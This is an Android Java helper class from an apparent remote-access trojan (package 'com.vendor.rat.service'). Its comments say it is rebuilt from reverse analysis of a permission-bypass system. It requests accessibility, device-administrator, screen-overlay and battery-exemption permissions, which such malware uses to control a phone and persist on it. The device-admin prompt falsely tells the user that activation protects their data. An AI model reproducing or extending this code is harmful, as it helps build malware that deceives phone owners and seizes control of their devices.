package com.vendor.rat.service;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

/**
 * 权限辅助类 (模块 02)
 *
 * 提供各类权限的检测和请求方法
 * 基于逆向分析: 权限绕过系统使用的辅助工具
 */
public class PermissionHelper {

    private static final String TAG = "PermissionHelper";

    // ============ 无障碍服务 ============

    /**
     * 检查无障碍服务是否已启用
     */
    public static boolean isAccessibilityEnabled(Context context) {
        return MyAccessibilityService.isAccessibilityEnabled(context);
    }

    /**
     * 打开无障碍服务设置
     */
    public static void openAccessibilitySettings(Context context) {
        MyAccessibilityService.openAccessibilitySettings(context);
    }

    // ============ 设备管理员 ============

    /**
     * 检查设备管理员是否已激活
     */
    public static boolean isDeviceAdminActive(Context context) {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(context, AppDeviceAdminReceiver.class);
            return dpm != null && dpm.isAdminActive(admin);
        } catch (Exception e) {
            Log.e(TAG, "Check device admin failed", e);
            return false;
        }
    }

    /**
     * 请求激活设备管理员
     * 基于逆向: Part 7 — 打开 ACTION_ADD_DEVICE_ADMIN
     */
    public static void requestDeviceAdmin(Context context) {
        try {
            ComponentName admin = new ComponentName(context, AppDeviceAdminReceiver.class);
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "需要激活设备管理员以保护您的数据安全");
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Request device admin failed", e);
        }
    }

    // ============ 悬浮窗权限 ============

    /**
     * 检查悬浮窗权限
     */
    public static boolean canDrawOverlays(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            return Settings.canDrawOverlays(context);
        }
        return true;
    }

    /**
     * 请求悬浮窗权限
     */
    public static void requestOverlayPermission(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }
    }

    // ============ 电池优化 ============

    /**
     * 请求忽略电池优化
     */
    public static void requestIgnoreBatteryOptimization(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                Intent intent = new Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } catch (Exception e) {
                Log.e(TAG, "Request battery optimization failed", e);
            }
        }
    }

    // ============ 应用详情 ============

    /**
     * 打开应用详情设置
     */
    public static void openAppDetails(Context context) {
        try {
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + context.getPackageName()));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Open app details failed", e);
        }
    }
}
